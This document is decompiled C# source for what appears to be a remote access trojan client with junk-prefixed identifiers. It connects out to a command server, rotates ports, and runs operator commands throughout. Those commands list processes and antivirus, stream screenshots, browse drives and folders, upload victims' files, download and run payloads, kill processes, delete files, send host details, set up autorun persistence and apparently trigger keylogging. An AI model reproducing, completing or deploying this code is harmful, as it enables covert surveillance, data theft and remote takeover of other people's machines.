using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace awdrgori;

public class awdrgoriMCDM
{
	public int port_sn = 0;

	private Dictionary<string, byte[]> awdrgoritasks = new Dictionary<string, byte[]>();

	public DateTime awdrgorirunTime;

	private int awdrgoribytesRead = 0;

	public bool awdrgorireqCnls = false;

	private int awdrgoriatmps = 0;

	public bool awdrgoriautCnls = false;

	public DateTime awdrgorilTimeUtc;

	private awdrgoriTHRE awdrgoriStateObj = new awdrgoriTHRE();

	private awdrgoriMYINF awdrgoriUPC;

	private awdrgoriOCMD awdrgoriCMD;

	private int awdrgoriscrSize = 200;

	private ThreadStart awdrgorifunStarter;

	public TcpClient awdrgoritcpsck;

	public NetworkStream awdrgorinetStream;

	private int awdrgoribuffSize = 1024;

	private awdrgoriDRIVF awdrgoriHD = new awdrgoriDRIVF();

	public bool awdrgoriis_working = false;

	private bool awdrgoriiswitch = false;

	private bool awdrgorithrRuning = false;

	private int awdrgorithreadCnts = 0;

	private bool awdrgoristr_writer = false;

	private bool awdrgoricapScreen = false;

	private Thread awdrgorifunThread;

	public void awdrgorido_start()
	{
		awdrgoriCONF.awdrgoriport = awdrgoriCONF.ports[0];
		awdrgorirunTime = DateTime.Now;
		awdrgoriUPC = new awdrgoriMYINF();
		awdrgoriCMD = new awdrgoriOCMD(this);
		awdrgoriHD.iserver = this;
		TimerCallback callback = awdrgorilookup_connect;
		Timer awdrgoritimer = new Timer(callback, awdrgoriStateObj, 32110, 36110);
		awdrgoriStateObj.awdrgoritimer = awdrgoritimer;
	}

	private void awdrgoricheckLastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(awdrgorirunTime.Subtract(mTimeUtc).Minutes);
			if (num > 5)
			{
				awdrgoritcpsck.Close();
				awdrgoriis_working = false;
			}
		}
		catch
		{
		}
	}

	public string awdrgorifile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|awdrgori".Split(new char[1] { '|' })[0] : "<|awdrgori".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|awdrgori".Split(new char[1] { '|' })[0] : "<|awdrgori".Split(new char[1] { '|' })[0]);
			text = text + awdrgoriget_size(fileInfo.Length) + ((!ret) ? ">|awdrgori".Split(new char[1] { '|' })[0] : "<|awdrgori".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				awdrgoripush_data(null, "awdrgori-filsz=|awdrgori".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public void awdrgorisaveFile(string filePath, string run)
	{
		try
		{
			byte[] array = awdrgoripull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
				if (run == "run")
				{
					awdrgoriCMD.awdrgorido_process(filePath, null, sendExp: true);
				}
			}
		}
		catch
		{
		}
	}

	private bool awdrgoriIPSConfig()
	{
		try
		{
			awdrgoriCONF.awdrgoridefaultP = awdrgoriCMD.awdrgoriserverIPD()[0];
			if (awdrgoriatmps > 20)
			{
				awdrgoriCONF.awdrgoridefaultP = awdrgoriCMD.awdrgoriserverIPD()[1];
				if (awdrgoriatmps > 34)
				{
					awdrgoriatmps = 0;
				}
			}
			awdrgoriatmps++;
			awdrgoritcpsck = new TcpClient();
			awdrgoritcpsck.Connect(awdrgoriCONF.awdrgoridefaultP, awdrgoriCONF.awdrgoriport);
			return true;
		}
		catch
		{
			awdrgoriports_switch();
			return false;
		}
	}

	private void awdrgorilookup_connect(object sturce)
	{
		try
		{
			if (!awdrgorithrRuning)
			{
				awdrgorithrRuning = true;
				awdrgoricheckLastatime(DateTime.Now);
				if (!awdrgoriis_working || !awdrgoritcpsck.Connected)
				{
					awdrgoriis_working = awdrgoriIPSConfig();
					if (awdrgoriis_working)
					{
						awdrgoribuffSize = awdrgoritcpsck.ReceiveBufferSize;
						if (awdrgorifunThread != null && awdrgorifunThread.IsAlive)
						{
							awdrgorifunThread.Abort();
						}
						awdrgoriHD.awdrgorimainPath = awdrgoriCONF.awdrgoriget_mpath();
						awdrgorisee_responce();
					}
				}
			}
			else
			{
				awdrgorithreadCnts++;
			}
			awdrgorithrRuning = false;
		}
		catch
		{
			awdrgoriatmps++;
			awdrgorithrRuning = false;
			awdrgorithreadCnts = 0;
			awdrgoristr_writer = false;
			awdrgoriis_working = false;
			awdrgoriiswitch = false;
		}
	}

	public void awdrgoriports_switch()
	{
		try
		{
			port_sn++;
			awdrgoriCONF.awdrgoriport = awdrgoriCONF.ports[port_sn];
			if (port_sn >= awdrgoriCONF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool awdrgorisend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				awdrgoripush_data(data, "awdrgori-afile=" + fileinfo);
				return false;
			}
			awdrgoripush_data(null, "awdrgori-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void awdrgorilist_processes(string cmd)
	{
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				long num = 0L;
				string text2 = "";
				try
				{
					PerformanceCounter val = new PerformanceCounter("Process|awdrgori".Split(new char[1] { '|' })[0], "Working Set - Private|awdrgori".Split(new char[1] { '|' })[0], processes[i].ProcessName);
					num = val.get_RawValue() / 1024L;
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(processes[i].MainModule!.FileName);
					text2 = versionInfo.FileDescription;
				}
				catch
				{
				}
				text = text + processes[i].Id + ">|awdrgori".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|awdrgori".Split(new char[1] { '|' })[0];
				text = text + num + ">|awdrgori".Split(new char[1] { '|' })[0];
				text = text + text2 + "<";
			}
			if (text == "")
			{
				text = "No-Access!> > > <|awdrgori".Split(new char[1] { '|' })[0];
			}
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			awdrgoripush_data(bytes, "awdrgori-" + cmd + "=process|awdrgori".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void awdrgoriload_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			string text = awdrgoriCONF.awdrgoriget_mpath() + awdrgoriCONF.awdrgorimainApp + ".exe|awdrgori".Split(new char[1] { '|' })[0];
			if (text != executablePath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(executablePath));
			}
			Thread.Sleep(10);
			awdrgoriCONF.awdrgoriset_run("mrdw|awdrgori".Split(new char[1] { '|' })[0], awdrgoriCONF.awdrgoriget_mpath() + awdrgoriCONF.awdrgorimainApp + ".exe|awdrgori".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void awdrgoriimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|awdrgori".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|awdrgori".Split(new char[1] { '|' })[0];
				text = text + awdrgoriget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				awdrgoripush_data(memoryStream.ToArray(), "awdrgori-thumb=|awdrgori".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void awdrgorisee_scren(string screenSize)
	{
		try
		{
			awdrgoriSCRNS awdrgoriSCRNS2 = new awdrgoriSCRNS();
			awdrgoriscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = awdrgoriSCRNS2.awdrgoriscreen(awdrgoriscrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				awdrgoripush_data(memoryStream.ToArray(), "awdrgori-sascr=capScreen|awdrgori".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void awdrgoriis_screen(string screenSize)
	{
		try
		{
			awdrgoriSCRNS awdrgoriSCRNS2 = new awdrgoriSCRNS();
			awdrgoriscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (awdrgoricapScreen && awdrgoriis_working)
			{
				Bitmap val = awdrgoriSCRNS2.awdrgoriscreen(awdrgoriscrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					awdrgoripush_data(memoryStream.ToArray(), "awdrgori-scren=capScreen|awdrgori".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void awdrgoriuser_info()
	{
		string text = awdrgoriUPC.awdrgorilancard + "|" + awdrgoriUPC.awdrgoricname + "|" + awdrgoriUPC.awdrgoriuname + "|" + awdrgoriUPC.awdrgoriuip + "|" + awdrgoriCONF.awdrgoriOsname() + "|" + awdrgoriUPC.awdrgoriapver + "|";
		text += "| !awdrgori".Split(new char[1] { '!' })[0];
		text = text + "|" + awdrgoriUPC.awdrgoriclientNum;
		text = text + "|" + awdrgoriCONF.awdrgoriget_mpath();
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		awdrgoripush_data(bytes, "awdrgori-info=user|awdrgori".Split(new char[1] { '|' })[0]);
	}

	private void awdrgoriscreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			awdrgoriscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void awdrgoripush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				if (fileName != "")
				{
					string type = "awdrgori-file=|awdrgori".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName;
					awdrgoripush_data(File.ReadAllBytes(lfile), type, tmp: true);
				}
			}
		}
		catch
		{
		}
	}

	public void awdrgoriremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	private string awdrgoriget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|awdrgori".Split(new char[1] { '|' })[0],
				"KB|awdrgori".Split(new char[1] { '|' })[0],
				"MB|awdrgori".Split(new char[1] { '|' })[0],
				"GB|awdrgori".Split(new char[1] { '|' })[0],
				"TB|awdrgori".Split(new char[1] { '|' })[0],
				"PB|awdrgori".Split(new char[1] { '|' })[0],
				"EB|awdrgori".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	public string[] awdrgoriget_command()
	{
		try
		{
			byte[] array = new byte[5];
			awdrgoribytesRead = awdrgorinetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= awdrgoribytesRead)
			{
				int count = ((num3 > awdrgoribuffSize) ? awdrgoribuffSize : num3);
				awdrgoribytesRead = awdrgorinetStream.Read(array2, num2, count);
				num2 += awdrgoribytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			awdrgoriis_working = false;
			return null;
		}
	}

	public byte[] awdrgoripull_data()
	{
		try
		{
			awdrgorirunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			awdrgoribytesRead = awdrgorinetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !awdrgorireqCnls)
			{
				int count = ((num3 > awdrgoribuffSize) ? awdrgoribuffSize : num3);
				awdrgoribytesRead = awdrgorinetStream.Read(array2, num, count);
				num += awdrgoribytesRead;
				num3 -= awdrgoribytesRead;
				awdrgorirunTime = DateTime.Now;
			}
			if (awdrgorireqCnls)
			{
				awdrgorinetStream.Flush();
				while (awdrgorinetStream.DataAvailable && awdrgorinetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			awdrgoriis_working = false;
			return null;
		}
	}

	private void awdrgorilistDrives()
	{
		string text = awdrgoriHD.awdrgorilookupDrives();
		awdrgoripush_data(null, "awdrgori-dirs=" + text);
	}

	private void awdrgorisee_responce()
	{
		if (!awdrgoriiswitch)
		{
			awdrgoriiswitch = true;
			awdrgorinetStream = awdrgoriCMD.awdrgoriNS(awdrgoritcpsck);
			awdrgoricapScreen = false;
			while (awdrgoriis_working)
			{
				string[] switchType = awdrgoriget_command();
				if (switchType != null)
				{
					awdrgorireqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("awdrgori-" + text) : ("awdrgori-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "awdrgori-procl":
						awdrgorifunStarter = delegate
						{
							awdrgorilist_processes("procl");
						};
						awdrgorifunThread = new Thread(awdrgorifunStarter);
						awdrgorifunThread.Start();
						break;
					case "awdrgori-getavs":
						awdrgorifunStarter = delegate
						{
							awdrgorilist_processes("getavs");
						};
						awdrgorifunThread = new Thread(awdrgorifunStarter);
						awdrgorifunThread.Start();
						break;
					case "awdrgori-thumb":
						awdrgoriimage_info(switchType[1]);
						break;
					case "awdrgori-clping":
						awdrgorirunTime = DateTime.Now;
						break;
					case "awdrgori-putsrt":
						awdrgoriload_app();
						break;
					case "awdrgori-filsz":
						awdrgorifunStarter = delegate
						{
							awdrgorifile_info(switchType[1]);
						};
						awdrgorifunThread = new Thread(awdrgorifunStarter);
						awdrgorifunThread.Start();
						break;
					case "awdrgori-rupth":
						awdrgoripush_data(null, "awdrgori-appth=|awdrgori".Split(new char[1] { '|' })[0] + awdrgoriCONF.awdrgoriget_mpath());
						break;
					case "awdrgori-dowf":
						awdrgorisaveFile(switchType[1], "");
						break;
					case "awdrgori-endpo":
						try
						{
							try
							{
								Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
							}
							catch
							{
								awdrgoriCMD.awdrgoridieProcess(Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())));
							}
						}
						catch
						{
						}
						break;
					case "awdrgori-scrsz":
						awdrgoriscreenSize(switchType[1]);
						break;
					case "awdrgori-cownar":
						awdrgoriCMD.awdrgorido_updated(7, switchType[1]);
						break;
					case "awdrgori-cscreen":
						awdrgorisee_scren(switchType[1]);
						break;
					case "awdrgori-dirs":
						awdrgorifunThread = new Thread(awdrgorilistDrives);
						awdrgorifunThread.Start();
						break;
					case "awdrgori-stops":
						awdrgoricapScreen = false;
						break;
					case "awdrgori-scren":
						awdrgoricapScreen = true;
						awdrgorifunStarter = delegate
						{
							awdrgoriis_screen(switchType[1]);
						};
						awdrgorifunThread = new Thread(awdrgorifunStarter);
						awdrgorifunThread.Start();
						break;
					case "awdrgori-uklog":
						awdrgoriCMD.awdrgorido_updated(3, switchType[1]);
						break;
					case "awdrgori-cnls":
						awdrgoriautCnls = true;
						awdrgorireqCnls = true;
						awdrgoricapScreen = false;
						break;
					case "awdrgori-udlt":
						awdrgoriCMD.awdrgoriremove_user();
						awdrgoritcpsck.Close();
						break;
					case "awdrgori-delt":
						awdrgorifunStarter = delegate
						{
							awdrgoriremove_file(switchType[1]);
						};
						awdrgorifunThread = new Thread(awdrgorifunStarter);
						awdrgorifunThread.Start();
						break;
					case "awdrgori-afile":
						awdrgorifunStarter = delegate
						{
							awdrgorisend_auto(switchType[1]);
						};
						awdrgorifunThread = new Thread(awdrgorifunStarter);
						awdrgorifunThread.Start();
						break;
					case "awdrgori-listf":
						awdrgorifunStarter = delegate
						{
							awdrgoriHD.awdrgorilookFiles(switchType[1]);
						};
						awdrgorifunThread = new Thread(awdrgorifunStarter);
						awdrgorifunThread.Start();
						break;
					case "awdrgori-file":
						awdrgorifunStarter = delegate
						{
							awdrgoripush_file(switchType[1]);
						};
						awdrgorifunThread = new Thread(awdrgorifunStarter);
						awdrgorifunThread.Start();
						break;
					case "awdrgori-info":
						awdrgorifunThread = new Thread(awdrgoriuser_info);
						awdrgorifunThread.Start();
						break;
					case "awdrgori-runf":
						awdrgoriCMD.awdrgorido_process(switchType[1].Split(new char[1] { '>' })[0], switchType[1].Split(new char[1] { '>' })[1], sendExp: true);
						break;
					case "awdrgori-fles":
					{
						string files = awdrgoriHD.awdrgorilookupFiles(switchType[1]);
						if (files != null)
						{
							awdrgorifunStarter = delegate
							{
								awdrgoripush_data(null, "awdrgori-fles=|awdrgori".Split(new char[1] { '|' })[0] + files);
							};
							awdrgorifunThread = new Thread(awdrgorifunStarter);
							awdrgorifunThread.Start();
						}
						break;
					}
					case "awdrgori-dowr":
						awdrgorisaveFile(switchType[1], "run|awdrgori".Split(new char[1] { '|' })[0]);
						break;
					case "awdrgori-fldr":
					{
						string Folders = awdrgoriHD.awdrgoricheckFolders(switchType[1]);
						if (Folders != null)
						{
							awdrgorifunStarter = delegate
							{
								awdrgoripush_data(null, "awdrgori-fldr=|awdrgori".Split(new char[1] { '|' })[0] + Folders);
							};
							awdrgorifunThread = new Thread(awdrgorifunStarter);
							awdrgorifunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				awdrgoriis_working = false;
				break;
			}
			awdrgoriis_working = false;
			awdrgoricapScreen = false;
		}
		awdrgoriiswitch = false;
	}

	public bool awdrgoripush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			awdrgorirunTime = DateTime.Now;
			if (awdrgoristr_writer)
			{
				return false;
			}
			awdrgoristr_writer = true;
			byte[] bytes = Encoding.UTF8.GetBytes(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
			byte[] array2 = new byte[num2 + bytes.Length + num];
			bytes2.CopyTo(array2, 0);
			bytes.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytes.Length);
				data.CopyTo(array2, 10 + bytes.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !awdrgorireqCnls)
			{
				int num5 = ((num4 > awdrgoribuffSize) ? awdrgoribuffSize : num4);
				awdrgorinetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				awdrgorirunTime = DateTime.Now;
			}
			awdrgoristr_writer = false;
			if (awdrgorireqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			awdrgoristr_writer = false;
			awdrgoriis_working = false;
			return false;
		}
	}
}
